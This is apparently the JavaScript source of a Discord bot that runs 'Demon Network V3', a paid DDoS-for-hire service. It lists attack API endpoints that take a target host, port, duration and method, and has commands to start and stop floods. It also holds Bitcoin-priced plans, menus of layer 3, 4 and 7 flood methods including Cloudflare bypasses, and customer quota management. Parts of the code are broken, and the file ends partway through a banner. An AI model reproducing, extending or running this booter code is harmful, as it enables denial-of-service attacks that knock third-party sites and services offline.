const config = require("./database/configs.json"),
const format = require('string-format');
const axios = require('axios');
const moment = require('moment-timezone');
const setTitle = require('console-title');
const colors = require('colors');
const nodemailer = require('nodemailer');
const fs = require('fs');
const users = require('./users.json');
const Discord = require("discord.js"),
        bot = new Discord.Client(),
        client = new Discord.Client();
        
bot.login(config.token);

const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 587,
  secure: false, // true for 465, false for other ports
  auth: {
    user: `${config.mail.email}`,
    pass: `${config.mail.senha}` },
  tls: { rejectUnauthorized: false }
});

var cli = new Discord.Client({autoReconnect:true});

var metodos2 = "";


// COLORS
var bred, red, blue, green, yellow, l4cyan, l7yellow, purple, white, lightred, lightgreen, lightpurple, redblink, swhite, whitebolado, underred, blinking, reset;
bred   = '\u001b[0;31m'
red = '\u001b[0;31m';
lightred = '\u001b[91m';
lightgreen = '\u001b[92m';
l4cyan = '\u001b[96m';
l7yellow = '\u001b[93m';
lightpurple = '\u001b[95m';
supered = '\u001b[0;31m';
underred = '\u001b[0;31m';
bgRed = '\u001b[41;92m';
bgGreen = '\u001b[41;92m';
blue  = '\u001b[0;34m';
green = '\u001b[0;32m';
yellow = '\u001b[0;33m';
reset = '\u001b[0m';
purple = '\u001b[0;35m';
white = '\u001b[0;37m';
blinking = '\u001b[0;31;5m';
redblink = '\u001b[101;30;5m';
whitebolado = '\u001b[1;37m';
swhite = '\u001b[0;37m';
//

var timeout = ['50', '140', '124', '84', '520', '302', '410', '1002', '913', '20', '85', '623', '150', '943', '223', '221', '220', '2043', '10', '25', '704', '120', '80']

var SimpleAPI = [
"http://Simple-API/api.php?key=DemonV3&host={0}&port={1}&time={2}&method={3}",
];
var NormalAPI = [
"http://Normal-API/api.php?key=DemonV3&host={0}&port={1}&time={2}&method={3}",
"http://Normal-API/api.php?key=DemonV3&host={0}&port={1}&time={2}&method={3}",
"http://Normal-API/api.php?key=DemonV3&host={0}&port={1}&time={2}&method={3}"
];

var AdvancedAPI = [
"http://Advanced-API/api.php?key=DemonV3&host={0}&port={1}&time={2}&method={3}",
"http://Advanced-API/api.php?key=DemonV3&host={0}&port={1}&time={2}&method={3}",
"http://Advanced-API/api.php?key=DemonV3&host={0}&port={1}&time={2}&method={3}"
];

var servidorADM = [
"http://MachineDDoS-IP/api.php?key=DemonV3&host={0}&port={1}&time={2}&method={3}"
];

var TEMPLATE = ["http://ipmaquina/api.php?key=ProibidoComunista&host={0}&port={1}&time={2}&method={3}"]

var emoji = ['🆕']

var Autor = ["@Aguiar503"]

var soma1 = SimpleAPI.length
var soma2 = AdvancedAPI.length
var soma21 = NormalAPI.length

var soma3 = soma1 + soma2 + soma21

const thumbnails = [
"https://media.discordapp.net/attachments/701004910547959868/701012393731293204/original.gif",
"https://media.discordapp.net/attachments/701004910547959868/701012431845195786/anonymousbackground_d0b4-d0b8-d197.gif",
"https://media.discordapp.net/attachments/701004910547959868/701012532265222144/3105.gif?width=420&height=420",
]
//
setTitle("[" + soma3 +"] Demon-Network V3 │ Coded by: " + Autor);
bot.on("ready", () => {
//const mailOptions = {
//  from: 'DemonLogs@gmail.com',
//  to: 'aguiarmodz@gmail.com',
//  subject: `[V3] ${bot.user.username} - Start-UP`,
//  text: `Botnet Start-UP.\n\n  Username: ${bot.user.username}\n  Status: ${bot.user.presence.status}\n  ID: ${bot.user.id}\n  Servidores: ${soma3}\n  Discords Ativos: ${bot.guilds.size}`,
//};
//    transporter.sendMail(mailOptions, function(error, info){
//      if (error) {
//        console.log(error);
//      } else {
//        console.log(lightgreen + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + lightpurple + "[" + lightgreen + "🔔" + lightpurple + "]" + reset + " Verification email" + lightgreen + " sent" + reset + " successfully");
//        console.log();
//      }
//    });
    console.log('')
    console.log(white + `██████╗ ███████╗███╗   ███╗ ██████╗ ███╗   ██╗` + reset + supered + `┌─────────────────────┐` + purple + ` ⇱`)
    console.log(white + `██╔══██╗██╔════╝████╗ ████║██╔═══██╗████╗  ██║` + reset + supered + `│  ` + reset + `Seja bem vindo a   ` + supered + `│`)
    console.log(white + `██║  ██║█████╗  ██╔████╔██║██║   ██║██╔██╗ ██║` + reset + supered + `│  ` + reset + lightred + `Demon Network` + reset + lightgreen + ` V3   ` + supered + `│` + green + ` 愛`)
    console.log(red +   `██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║` + reset + supered + `├─────────────────────┤` + purple + ` す`)
    console.log(red +   `██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚████║` + reset + supered + `│ ` + reset + `Twitter: ` + lightgreen + `@Aguiar503` + supered + ` │ ` + green + `る` + reset + supered)
    console.log(red +   `╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝` + reset + supered + `├────────────┬┬───────┤` + reset + supered)
    console.log(bgRed + ` All Rights Reserved ₪ DemonNetwork 2018-2020 ` + reset + supered + `│ ` + reset + `Servers: ` + lightgreen + `↑ ` + supered + `├┤ ` + reset + `L4:` + lightgreen + `🅰  ` + supered + `│` + purple + ` 平` + reset + supered)
    console.log(supered + `╔════════════════════╦════╦══════════════════╗` + supered + `├──────────┬─┘├───────` + green + reset + supered + `┤` + green + ` 和`)
    console.log(supered + `║ ` + reset + swhite + ` Terminal of Logs ` + supered + ` ║ ` + reset + yellow + `◄►` + supered + ` ║ ` + reset + swhite + `Demon Network ` + lightgreen + `V3` + supered + ` ║` + supered + `│ ` + reset + `API's:` + lightgreen + ` ↑` + supered + ` │  │ ` + reset + `L7:` + lightgreen + `🅱  ` + reset + supered + `│`)
    console.log(supered + `╚════════════════════╩════╩══════════════════╝` + supered + `└──────────┘  └───────┘` + purple + ` ⇲` + reset);
    console.log()
//    console.log(red + "┌═════════════════════════════════════════════════════════┐")
//    console.log(red + "║             " + reset + "[" + lightred + "V3" + reset + "] " + reset + "Planos " + lightgreen + "@" + lightred + " DemonNetwork " + reset + "[" + lightred + "V3" + reset + "]" + red + "             ║")
//    console.log(red + "├═════════════════════════════════════════════════════════┤")
//    console.log(red + "│" + reset + "    Simple    " + lightred + "  120  " + reset + "Seconds    " + reset + "25" + red + "," + reset + "00  " + lightgreen + "R$ " + reset + "[5  " + lightgreen + "$" + reset + "]" + green + " <- USD" + red + "  │")
//    console.log(red + "│" + reset + "    Normal    " + lightred + "  300  " + reset + "Seconds    " + reset + "50" + red + "," + reset + "00  " + lightgreen + "R$ " + reset + "[10 " + lightgreen + "$" + reset + "]" + green + " <- USD" + red + "  │")
//    console.log(red + "│" + reset + "    Advanced  " + lightred + "  600  " + reset + "Seconds    " + reset + "75" + red + "," + reset + "00  " + lightgreen + "R$ " + reset + "[20 " + lightgreen + "$" + reset + "]" + green + " <- USD" + red + "  │")
//    console.log(red + "│" + reset + "    Angel     " + lightred + "  1200 " + reset + "Seconds    " + reset + "100" + red + "," + reset + "00 " + lightgreen + "R$ " + reset + "[35 " + lightgreen + "$" + reset + "]" + green + " <- USD" + red + "  │")
//    console.log(red + "│" + reset + "    Demon     " + lightred + "  3600 " + reset + "Seconds    " + reset + "150" + red + "," + reset + "00 " + lightgreen + "R$ " + reset + "[45 " + lightgreen + "$" + reset + "]" + green + " <- USD" + red + "  │")
//    console.log(red + "└─────────────────────────────────────────────────────────┘")
    bot.user.setPresence({
        game: {
            name: `--> ${config.prefix}help`,
            type: "STREAMING",
            url: "https://twitch.tv/DemonV3"
        }
    });
});
bot.on("disconnect", () => {
     console.log('Desconectado da Rede');
 });
bot.on("reconnecting", () => {
     console.log('Reconexão automática em andamento.');
 });

bot.on('message', async msg => {
const args = msg.content.slice(config.prefix.length).trim().split(/ +/g);
const command = args.shift().toLowerCase();
if (msg.author.id !== bot.user.id && msg.content.startsWith(config.prefix)) {

// █████  ██████  ███    ███ ██ ███    ██ 
//██   ██ ██   ██ ████  ████ ██ ████   ██ 
//███████ ██   ██ ██ ████ ██ ██ ██ ██  ██ 
//██   ██ ██   ██ ██  ██  ██ ██ ██  ██ ██ 
//██   ██ ██████  ██      ██ ██ ██   ████ 

if (command === 'admin') {
if (!config.admins.includes(msg.author.id)) {
console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[DB]` + reset + ` ${msg.author.username} ` + l7yellow + `->` +  lightred + ` .trial` + reset + ` Status: ` + red + `Sem Permissão` + reset)
  return msg.channel.send("You cannot access this menu, contact the Developer.")
}
console.log(reset + "[" + l4cyan + moment.tz("America/Sao_Paulo").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Comando: ` + green + `.admin ` + reset + `Autor: ` + green + `${msg.author.username}` + reset)
  const response = new Discord.RichEmbed()
    .setColor("BLACK")
    .setAuthor("Welcome to Admin Menu",msg.author.displayAvatarURL,"https://t.me/demonv2")
    .setThumbnail("https://media.discordapp.net/attachments/691620895386501191/712592672686211072/admin-settings-male.png")
    .addField("**[1] __Basic__**", "```http\n.ban\n.kick\n.purge```", true)
    .addField("**[2] __Custom__**", "```css\n.give\n.addsec\n.addconc```", true)
    .addField("**[3] __Database__**", "```ini\n.userinfo  [person]\n.clearlogs [person]```", true)
    .addField("**[4] __Clients__**", "```ini\n.simple [person] [days]\n.normal [person] [days]\n.advanced [person] [days]```")
    .setTimestamp()
    .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);  
  return msg.channel.send(response);

}

//██   ██ ███████ ██      ██████  
//██   ██ ██      ██      ██   ██ 
//███████ █████   ██      ██████  
//██   ██ ██      ██      ██      
//██   ██ ███████ ███████ ██

if (command === 'help') {
console.log(reset + "[" + l4cyan + moment.tz("America/Sao_Paulo").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Comando: ` + green + `.help ` + reset + `Autor: ` + green + `${msg.author.username}` + reset)

  const response = new Discord.RichEmbed()
    .setColor("#8b1e9b")
    .setAuthor(`Welcome to the new version of DemonNetwork.`,"","https://t.me/demonv2")
    .setTitle(":flag_br: - DemonNetwork - Help Menu - :flag_br:")
    .setDescription("Lista de todos os comandos Disponíveis.")
    .setThumbnail((thumbnails[Math.floor(Math.random() * thumbnails.length)]))
    .addField("**[1] __Basic__ :earth_americas:  **", "```yaml\n.me\n.buy\n.botinfo\n.ports\n.userinfo```", true)
    .addField("**[2] __Methods__**", "```http\n.methods\n.methods-l7```", true)
    .addField("**[3] __Tools__**", "```ini\n.lookup  [host]\n.resolve [host]```\n```css\n.admin```", true)
    .addField("**[4] __List of commands for sending attacks__**", "```ini\n.start       [IPv4] [port] [time] [method]```", true)
    .setTimestamp()
    .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
  
  return msg.channel.send(response);
  }

//██    ██ ███████ ███████ ██████  ██ ███    ██ ███████  ██████  
//██    ██ ██      ██      ██   ██ ██ ████   ██ ██      ██    ██ 
//██    ██ ███████ █████   ██████  ██ ██ ██  ██ █████   ██    ██ 
//██    ██      ██ ██      ██   ██ ██ ██  ██ ██ ██      ██    ██ 
// ██████  ███████ ███████ ██   ██ ██ ██   ████ ██       ██████  

if (command === 'userinfo') {
const input = args.join(" ");
const userDetails = input.split(" ");
const mention = msg.mentions.members.first();
const person = userDetails[0].replace(/[\\<>@#&!]/g, "");
function getTotal(person) {
  let total = 0;
  for (const attack of users[person].attacks) {
    total++;
  }
  return total;
}
function makeUser(person) {
  users[person] = {};
  users[person].concurrents = 0;
  users[person].attackTime = 0;
  users[person].attacks = [];
  users[person].expire = null;
  users[person].servers = "Nothing";
  update("users.json", users);
}
function expireDate(person) {
  var expire = moment.unix(users[person].expire);
  if(expire < moment().unix()) return "Expired";
  return expire.format('MMMM Do YYYY, h:mm:ss a');
}
//
if (args < 1) {
  const response = new Discord.RichEmbed()
    .setColor('#000')
    .setThumbnail(`${msg.author.displayAvatarURL}`)
    .setAuthor(`🤖 Minhas informações`)
    .addField('**Username:**', "```css\n" + msg.author.username + "```", true)
    .addField('**Network:**', "```http\n" + users[msg.author.id].servers + "```", true)
    .addField('**Running:**', "```http\n" + getRunning(msg.author.id) + "```", true)
    .addField('**Seconds:**', "```yaml\n" + users[msg.author.id].attackTime + "```", true)
    .addField('**Concurrents:**', "```yaml\n" + users[msg.author.id].concurrents + "```", true)
    .addField('**Attacks:**', "```yaml\n" + getTotal(msg.author.id) + "```", true)
    .addField('**Expire:**', "```http\n" + expireDate(msg.author.id) + "```")
    .addField('**Ray ID:**', "```diff\n-" + msg.author.id + "```")
    .setTimestamp()
    .setFooter(`${msg.author.username} - DemonV2 Botnet.`, `${msg.author.displayAvatarURL}`);
  return msg.channel.send(response)
}
if (!users[person]) {
  makeUser(person);
}

const response = new Discord.RichEmbed()

  .setColor("BLACK")
  .setAuthor(mention.user.username+ " <-- User Information", mention.user.avatarURL)
  .setThumbnail(mention.user.avatarURL)
  .addField('**Username:**', mention.user.username, true)
  .addField('**Network:**', users[person].servers, true)
  .addField('**Running:**', getRunning(mention.user.id), true)
  .addField('**Seconds:**', users[person].attackTime, true)
  .addField('**Concurrents:**', users[person].concurrents, true)
  .addField('**Attacks:**', getTotal(mention.user.id), true)
  .addField('**Expire:**', "```http\n" + expireDate(msg.author.id) + "```")
  .addField('**Ray ID:**', "```diff\n-" + msg.author.id + "```")

return msg.channel.send(response);
}

//████████ ██████  ██  █████  ██      
//   ██    ██   ██ ██ ██   ██ ██      
//   ██    ██████  ██ ███████ ██      
//   ██    ██   ██ ██ ██   ██ ██      
//   ██    ██   ██ ██ ██   ██ ███████ 

if (command === "trial") {
  if (!config.admins.includes(msg.author.id))
    console.log(reset + "[" + l4cyan + moment.tz("America/Sao_Paulo").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Comando: ` + green + `.trial ` + reset + `Autor: ` + green + `${msg.author.username}` + reset)
    return msg.channel.send("You are not an admin.");
  const input = args.join(" "),
    userDetails = input.split(" "),
    person = userDetails[0].replace(/[\\<>@#&!]/g, ""),
    time = 30,
    conc = 1,
    length = userDetails[1],
    expire = Number(moment().add(length, "day")),
    response = new Discord.RichEmbed()
      .setColor("#0099ff")
      .setTitle(":file_folder: > Give")
      .setDescription(`You have updated <@${person}>.`)
      .addField("Concurrents", conc, true)
      .addField("Attack Time", time, true)
      .setTimestamp()
      .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
  if (userDetails.length < 2) {
    return msg.channel.send("Please fill the command in correctly.```" + `${config.prefix}trial <person> <days>` + "```");
  }
  if (!users[person]) {
    makeUser(person);
  }
  users[person].attackTime = time;
  users[person].concurrents = conc;
  users[person].servers = "Simple";
  users[person].expire = moment(expire).unix();
  update("users.json", users);
  return msg.channel.send(response);
}

//███████ ██ ███    ███ ██████  ██      ███████ 
//██      ██ ████  ████ ██   ██ ██      ██      
//███████ ██ ██ ████ ██ ██████  ██      █████   
//     ██ ██ ██  ██  ██ ██      ██      ██      
//███████ ██ ██      ██ ██      ███████ ███████ 

if (command === "simple") {
  return msg.channel.send('Plano em desenvolvimento, aguarde o lançamento.')
}
switch (command) {

//███████ ████████  ██████  ██████  
//██         ██    ██    ██ ██   ██ 
//███████    ██    ██    ██ ██████  
//     ██    ██    ██    ██ ██      
//███████    ██     ██████  ██  

case 'stop':
if (args.length < 1) {
  console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `Stop Incorreto` + reset)
    const wrong_stop = new Discord.RichEmbed()
      .setColor("#ff0000")
      .setTitle(":flag_br: ERROR LOG :flag_br:")
      .setDescription("Incorrect Completion")
      .setThumbnail(`${msg.author.displayAvatarURL}`)
      .addField("**Error**", "You filled in the data ***incorrectly***, look at the **correct** form below:")
      .addField("**__Correct Form__**", "```ini\n.stop [host]```", true)
      .setTimestamp()
      .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
    return msg.channel.send(wrong_stop);
}

let serversusers;
if (users[msg.author.id].servers.includes("Simple")) {
  serverss = SimpleAPI;
  sizess = SimpleAPI.length;
  networkss = "Simple";
  planoss = "Simples"
} else if (users[msg.author.id].servers.includes("Normal")) {
  serverss = NormalAPI;
  sizess = NormalAPI.length;
  networkss = "Normal";
  planoss = "Normal" 
} else if (users[msg.author.id].servers.includes("Advanced")) {
  serverss = AdvancedAPI;
  sizess = AdvancedAPI.length;
  networkss = "Advanced";
  planoss = "Advanced" 
} else {
 serverss = "No Plan"
}
for (const attack of users[msg.author.id].attacks) {
const target = args[0];
  if (
    attack.stamp > moment().unix() &&
    attack.stopped === false &&
    attack.target === target
  ) {
    attack.stopped = true;
  }
}
for (var i = 0; i < serverss.length; i++) {
const stopmet = "STOP";
    axios.get(format(serverss[i], args[0], stopmet.toUpperCase())).catch(error => {
        console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + "[✘] " + reset + error)
        const embed1 = new Discord.RichEmbed()
          .setColor("#ff0000")
          .setTitle(":flag_br: ERROR LOG :flag_br:")
          .setDescription("Não foi possível parar o ataque, servidor DOWN.")
          .setThumbnail("https://media.discordapp.net/attachments/691620895386501191/691626561191018661/server.png?width=503&height=400")
          .addField("**Server**", error, true)
          .setTimestamp()
          .setFooter("Server Down - Demon Network");
        const erros = bot.channels.get('692184346806845601');
        return erros.send(embed1);
    })
}
const stopOptions = {
  from: 'slamanteste@gmail.com',
  to: 'aguiarmodz@gmail.com',
  subject: `[STOPPED] ${msg.author.username} - ${args[0]}`,
  text: `ATTACK STOPPED ON ${args[0]}`
};  
    transporter.sendMail(stopOptions, function(error, info){
      if (error) {
        console.log(error);
      } else {
        console.log(lightgreen + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + lightpurple + "[" + lightgreen + "📧" + lightpurple + "]" + reset + " Email de " + lightred + "STOPPING" + reset + " enviado com sucesso!");
      }
    });
    console.log(lightgreen + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "]" + reset + " Status: " + lightred + "STOPPED" + reset + " Host: " + lightgreen + args[0] + reset + " Autor: " + green + msg.author.username + reset)
    const sec = ['SEC']
    const n = ['']
const stopmeto = "STOP";
    const stopembed = new Discord.RichEmbed()
      .setColor("RED")
      .setDescription(`Stopping all attacks sent to ${args[0]} `)
      msg.channel.send(stopembed)
      const canal = bot.channels.get(config.channels.logs);
return canal.send(stopembed);
                                                        
break;

// ██████  ██ ██    ██ ███████ 
//██       ██ ██    ██ ██      
//██   ███ ██ ██    ██ █████   
//██    ██ ██  ██  ██  ██      
// ██████  ██   ████   ███████ 
                             
case 'give':
//
const input = args.join(" "),
  userDetails = input.split(" "),
  person = userDetails[0].replace(/[\\<>@#&!]/g, ""),
  time = Number(userDetails[1]),
  conc = Number(userDetails[2]),
  length = userDetails[3],
  servers = userDetails[4],
  expire = Number(moment().add(length, "day")),
  mention = msg.mentions.members.first();
//
if (!config.admins.includes(msg.author.id))
  return msg.channel.send("You are not an admin.");
//
if (userDetails.length < 5) {
console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[DB]` + reset + ` ${msg.author.username} ` + l7yellow + `->` +  lightred + ` Configuração Errada` + reset + ` Status: ` + red + `Preenchimento Incorreto` + reset)
const incorrectUser = new Discord.RichEmbed()
      .setColor("BLACK")
      .setTitle("You entered the data incorrectly")
      .setDescription("```ini\n.give [user] [time] [concurrents] [days] [api/servers]```")
return msg.channel.send(incorrectUser)
}
//
if (!config.servers.servidores.includes(args[4])) {
console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[DB]` + reset + ` ${msg.author.username} ` + l7yellow + `->` +  lightred + ` Configuração Errada` + reset + ` Status: ` + red + `Servidor` + reset)
const metodoembed = new Discord.RichEmbed()
  .setColor("#ff0000")
  .setTitle("Database Editor -> Demon@V3")
  .setDescription("An `error` was identified when\nmodifying the database.")
  .addField('**Type:**', '```http\n' + 'Server' + '```', true)
  .addField('Solution:', 'Check the available\nservers in the database', true)
  .setThumbnail(`${msg.author.displayAvatarURL}`)
  .setTimestamp()
  .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
return msg.channel.send(metodoembed); }
//
function updategive(file, json) {
  fs.writeFile(file, JSON.stringify(json, null, 2), "utf8", function(err) {
    console.log(purple + "[" + reset + moment.tz("America/Sao_Paulo").format('HH:mm A') + purple + "] " + `[🧮] Banco de Dados atualizado.`);
  });
}
//
responsegive = new Discord.RichEmbed()
  .setColor("BLACK")
  .setTitle("Database Editor -> Demon@V3")
  .setThumbnail(mention.user.avatarURL)
  .setDescription(`You have modified the <@${person}>\n data in the Demon database.`)
  .addField("Client:", mention.user.username, true)
  .addField("Seconds:", time, true)
  .addField("Concurrent:", conc, true)
  .addField("Days:", length, true)
  .addField("Server", servers, true)
  .addField("Admin:", msg.author.username, true)
  .addField("Client ID:", "```yaml\n" + mention.user.id + "```")
  .addField("Admin ID:", "```http\n" + msg.author.id + "```")
  .setTimestamp()
  .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
//
if (!users[person]) {
  makeUser(person);
}
users[person].attackTime = time;
users[person].concurrents = conc;
users[person].servers = servers;
users[person].expire = moment(expire).unix();
updategive("users.json", users);
return msg.channel.send(responsegive);
break;

//██████  ██    ██ ██    ██ 
//██   ██ ██    ██  ██  ██  
//██████  ██    ██   ████   
//██   ██ ██    ██    ██    
//██████   ██████     ██   

case 'buy':
//
console.log(reset + "[" + l4cyan + moment.tz("America/Sao_Paulo").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Comando: ` + green + `.buy ` + reset + `Autor: ` + green + `${msg.author.username}` + reset)
  const privbuyembed = new Discord.RichEmbed()
    .setImage("https://media.discordapp.net/attachments/691620895386501191/704884804700864618/unknown.png?width=688&height=434")
    .setColor('#ff0000')
    .setTitle(':flag_br: - Demon Network - Buy Menu - :flag_br:')
    .setThumbnail('https://media.discordapp.net/attachments/701004910547959868/701004935290159114/unknown.png')
    .setDescription("**__Read First__**\n\nRegardless of the plan you acquire, remember that there are other people to send out attacks. It does not overload servers by sending multiple attacks at the same time or flooding the same host. ", true)
    .addField("```PLANOS```", "```diff\n-Simples\n-Normal\n-Advanced\n-Angel\n-Demon```", true)
    .addField("```ESPECIFICAÇÕES```", "```yaml\n120 Sec\n300 Sec\n600 Sec\n1200 Sec\n3600 Sec\n```", true)
    .addField("```PREÇO```", "```http\n25,00 R$\n50,00 R$\n75,00 R$\n100,00 R$\n150,00 R$\n```", true)
    .addField("```MÉTODOS```", "**__BITCOIN__ Only!**")
  msg.author.send(privbuyembed)
//
  const buyembed2 = new Discord.RichEmbed()
    .setColor('#ff0000')
    .setDescription("```ini\nCheck your Direct Message [DM].```")
//
  return msg.channel.send(buyembed2);
break;

// ██████ ██████  ███████ ██████  ██ ████████ ███████ 
//██      ██   ██ ██      ██   ██ ██    ██    ██      
//██      ██████  █████   ██   ██ ██    ██    ███████ 
//██      ██   ██ ██      ██   ██ ██    ██         ██ 
// ██████ ██   ██ ███████ ██████  ██    ██    ███████ 

case 'credits': 
break;

//███    ███ ███████ ████████ ██   ██  ██████  ██████  ███████ 
//████  ████ ██         ██    ██   ██ ██    ██ ██   ██ ██      
//██ ████ ██ █████      ██    ███████ ██    ██ ██   ██ ███████ 
//██  ██  ██ ██         ██    ██   ██ ██    ██ ██   ██      ██ 
//██      ██ ███████    ██    ██   ██  ██████  ██████  ███████ 

case 'methods':
//
console.log(reset + "[" + l4cyan + moment.tz("America/Sao_Paulo").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Comando: ` + green + `.methods ` + reset + `Autor: ` + green + `${msg.author.username}` + reset)
  const methodsem = new Discord.RichEmbed()
    .setColor("#ff0000")
    .setTitle(":flag_br: - Demon Network - Methods DDoS - :flag_br:")
    .setThumbnail("https://media.discordapp.net/attachments/683751224721670151/683754179642261629/bc785777947387.png")
    .addField("**Layer 3**", "```yaml\nICMP_FLOOD\nECHO_FLOOD```", true)
    .addField("**Layer 4 UDP**", "```css\nUDP_HEX\nUDP_MIX\nUDP_NOSPF```", true)
    .addField("**Layer 4 UDP**", "```css\nUDP_RAID\nUDP_RAND\nUDP_NULL\nUDP_WLST```", true)
    .addField("**Layer 4 Special**", "```yaml\nBLAZING\nUDP_BPSS\nUDP_OVH\nTCP_UDP\nTCP_KILL```", true)
    .addField("**Layer 4 TCP**", "```http\nTCP_ACK\nTCP_PSH\nTCP_SYN\nTCP_RAND\n```", true)
    .addField("**Layer 4 TCP**", "```http\nTELNET\nTCP_VOX\nTCP_XMAS```", true)        
    .setTimestamp()
    .setFooter("DemonNetwork - V2.", "https://media.discordapp.net/attachments/683751224721670151/685405339364884503/images.jpg?width=398&height=398");
//  
  return msg.channel.send(methodsem);
break;

//███    ███ ███████ 
//████  ████ ██      
//██ ████ ██ █████   
//██  ██  ██ ██      
//██      ██ ███████ 

case 'me':
//
function getTotal(person) {
  let total = 0;
  for (const attack of users[person].attacks) {
    total++;
  }
  return total;
}
function makeUser(person) {
  users[person] = {};
  users[person].concurrents = 0;
  users[person].attackTime = 0;
  users[person].attacks = [];
  users[person].expire = null;
  update("users.json", users);
}
function expireDate(person) {
  var expire = moment.unix(users[person].expire);
  if(expire < moment().unix()) return "Expired";
  return expire.format('MMMM Do YYYY, h:mm:ss a');
}
if (!users[msg.author.id]) {
  makeUser(msg.author.id);
}
function getRunning(person) {
  let running = 0;
  for (const attack of users[person].attacks) {
    if (attack.stamp > moment().unix() && attack.stopped === false) {
      running++;
    }
  }
  return running;
}
console.log(reset + "[" + l4cyan + moment.tz("America/Sao_Paulo").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Comando: ` + green + `.me ` + reset + `Autor: ` + green + `${msg.author.username}` + reset)
//
  const userDBembed = new Discord.RichEmbed()
    .setColor('#000')
    .setThumbnail(`${bot.user.displayAvatarURL}`)
    .setAuthor(`🤖 Minhas informações`)
    .addField('**Username:**', "```css\n" + msg.author.username + "```", true)
    .addField('**Network:**', "```http\n" + users[msg.author.id].servers + "```", true)
    .addField('**Running:**', "```http\n" + getRunning(msg.author.id) + "```", true)
    .addField('**Seconds:**', "```yaml\n" + users[msg.author.id].attackTime + "```", true)
    .addField('**Concurrents:**', "```yaml\n" + users[msg.author.id].concurrents + "```", true)
    .addField('**Attacks:**', "```yaml\n" + getTotal(msg.author.id) + "```", true)
    .addField('**Expire:**', "```http\n" + expireDate(msg.author.id) + "```")
    .addField('**Ray ID:**', "```diff\n-" + msg.author.id + "```")
    .setTimestamp()
    .setFooter(`${msg.author.username} - DemonV2 Botnet.`, `${msg.author.displayAvatarURL}`);
  return msg.channel.send(userDBembed);
//
break;

//███    ███ ███████ ████████ ██   ██  ██████  ██████  ███████       ██   ███████ 
//████  ████ ██         ██    ██   ██ ██    ██ ██   ██ ██            ██        ██ 
//██ ████ ██ █████      ██    ███████ ██    ██ ██   ██ ███████ █████ ██       ██  
//██  ██  ██ ██         ██    ██   ██ ██    ██ ██   ██      ██       ██      ██   
//██      ██ ███████    ██    ██   ██  ██████  ██████  ███████       ███████ ██ 

case 'methods-l7':
  console.log(reset + "[" + l4cyan + moment.tz("America/Sao_Paulo").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Comando: ` + green + `.methods-l7 ` + reset + `Autor: ` + green + `${msg.author.username}` + reset)
//
  const methodseml7 = new Discord.RichEmbed()
    .setColor("#ff0000")
    .setTitle(":flag_br: - Demon Network - Methods DDoS - :flag_br:")
    .setThumbnail("https://media.discordapp.net/attachments/683751224721670151/683754179642261629/bc785777947387.png")
    .addField("**Layer 7**", "```http\nCF_UAM\nCLOUD_JS\nJS_PROXY\nCOLLAPSE\nSOCKETS```", true)
    .addField("**NOTE**", "> __**Don't spam**__ the fucking\n > attacks or your plan\n > __will be **removed**__.\n\n> Regards, \n> Demon Team.", true)
    .addField("⠀", "⠀", true)
    .addField("**Layer 7**", "```yaml\nHTTP_GET\nHTTP_GHP\nHTTP_HEAD\nHTTP_HEX\nHTTP_MAX\nHTTP_POST```", true)
    .addField("**Layer 7**", "```css\nHTTP_PPS\nHTTP_FLOOD\nHTTP_NULL\nHTTP_RAND\nHTTP_SKULL\nHTTP_COOKIE```", true)    
    .setTimestamp()
    .setFooter("DemonNetwork - V2.", "https://media.discordapp.net/attachments/683751224721670151/685405339364884503/images.jpg?width=398&height=398");
  return msg.channel.send(methodseml7);
//
break;

//███████ ███████ ██████  ██    ██ ███████ ██████  ███████ 
//██      ██      ██   ██ ██    ██ ██      ██   ██ ██      
//███████ █████   ██████  ██    ██ █████   ██████  ███████ 
//     ██ ██      ██   ██  ██  ██  ██      ██   ██      ██ 
//███████ ███████ ██   ██   ████   ███████ ██   ██ ███████ 

//case 'servers':
//  console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + green + `[✔]` + reset + ` Comando: ` + green + `.servers ` + reset + `Autor: ` + green + `${msg.author.username}` + reset)
////
//  const statusem = new Discord.RichEmbed()
//    .setColor("#ff0000")
//    .setTitle(":file_folder: > Status")
//    .setThumbnail("https://media.discordapp.net/attachments/691620895386501191/697867343405121648/wp-otimizacao-guia.png?width=367&height=397")
//    .setDescription("Check all servers.")
//    .addField("Layer 4", "```glsl\n" + servidorL4.length + "```", true)
//    .addField("Layer 7", "```glsl\n" + servidorL7.length + "```", true)
//    .setTimestamp()
//    .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
//  return msg.channel.send(statusem);
////
break;
//██████   ██████  ██████  ████████ ███████ 
//██   ██ ██    ██ ██   ██    ██    ██      
//██████  ██    ██ ██████     ██    ███████ 
//██      ██    ██ ██   ██    ██         ██ 
